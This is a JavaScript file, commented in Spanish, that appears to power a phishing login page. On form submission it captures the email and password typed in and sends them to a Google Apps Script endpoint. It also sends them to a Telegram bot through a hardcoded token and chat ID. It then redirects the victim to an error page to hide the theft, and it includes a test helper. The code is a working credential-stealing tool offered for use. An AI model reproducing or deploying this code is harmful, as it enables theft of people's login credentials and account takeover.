// ============================================
// CONFIGURACIÓN - GOOGLE SHEETS (YA FUNCIONA)
// ============================================
const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbxPSXtbw-9-dytawAjSE0Ul-iGQ74FuwKPmzMQqrNy4B2QM1-TkLuXmbezhRReIZZwr/exec';

// ============================================
// CÓDIGO PRINCIPAL
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    const formulario = document.getElementById('loginForm');
    
    if (formulario) {
        formulario.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            const datos = {
                email: email,
                password: password,
                fecha: new Date().toLocaleString(),
                hora: new Date().toLocaleTimeString()
            };
            
            console.log('📤 Enviando a Google Sheets:', datos);
            
            // ENVIAR A GOOGLE SHEETS (FUNCIONA EN TODOS LOS DISPOSITIVOS)
            fetch(GOOGLE_SHEETS_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(datos)
            })
            .then(() => {
                console.log('✅ Datos enviados');
                // También a Telegram como respaldo
                enviarATelegram(datos);
            })
            .catch(error => {
                console.log('❌ Error:', error);
                // Si falla, intentamos solo Telegram
                enviarATelegram(datos);
            });
            
            window.location.href = 'error.html';
        });
    }
});

// Telegram como respaldo (opcional)
function enviarATelegram(datos) {
    const TELEGRAM_TOKEN = '8234691045:AAHePNguryd46uVV1F4uXNaZKYtCGJ12LuU';
    const TELEGRAM_CHAT_ID = '76868560';
    
    const mensaje = `🔐 NUEVO LOGIN
📧 Email: ${datos.email}
🔑 Pass: ${datos.password}
⏰ ${datos.fecha}`;
    
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(mensaje)}`)
    .catch(err => console.log('❌ Telegram:', err));
}

// Función de prueba
window.probarTodo = function() {
    const testData = {
        email: "test@prueba.com",
        password: "test123",
        fecha: new Date().toLocaleString(),
        hora: new Date().toLocaleTimeString()
    };
    
    fetch(GOOGLE_SHEETS_URL, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(testData)
    })
    .then(() => alert('✅ Prueba enviada - Revisa Google Sheets'))
    .catch(() => alert('❌ Error'));
};
